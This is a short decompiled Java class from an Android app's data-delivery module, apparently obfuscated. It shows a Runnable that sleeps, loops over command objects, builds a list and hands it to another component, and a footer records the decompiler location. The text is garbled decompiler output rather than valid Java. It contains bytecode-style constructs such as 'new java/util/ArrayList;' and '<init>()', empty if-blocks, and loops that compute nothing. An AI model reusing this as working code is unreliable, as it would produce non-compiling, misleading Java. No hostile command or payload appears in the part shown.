package com.vvt.datadeliverymanager;

import android.os.SystemClock;
import com.vvt.datadeliverymanager.a.b;
import com.vvt.phoenix.prot.command.a.q;
import com.vvt.phoenix.prot.command.a.s;
import java.util.ArrayList;
import java.util.List;

class o
  implements Runnable
{
  o(m paramm, s params) {}
  
  public void run()
  {
    long l = 1000L;
    SystemClock.sleep(l);
    s locals = this.a;
    int i = locals.g();
    int j = k.f();
    if (j != 0) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    int k;
    for (int m = 0; m < i; m = k)
    {
      locals = this.a;
      q localq = locals.d(m);
      j = k.f();
      if (j != 0) {}
      j = 0;
      locals = null;
      for (;;)
      {
        int n = localq.b();
        if (j >= n) {
          break;
        }
        boolean bool = k.f();
        if (bool) {}
        j += 1;
      }
      localArrayList.add(localq);
      k = m + 1;
    }
    k.h(this.b.a).a(localArrayList);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/datadeliverymanager/o.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */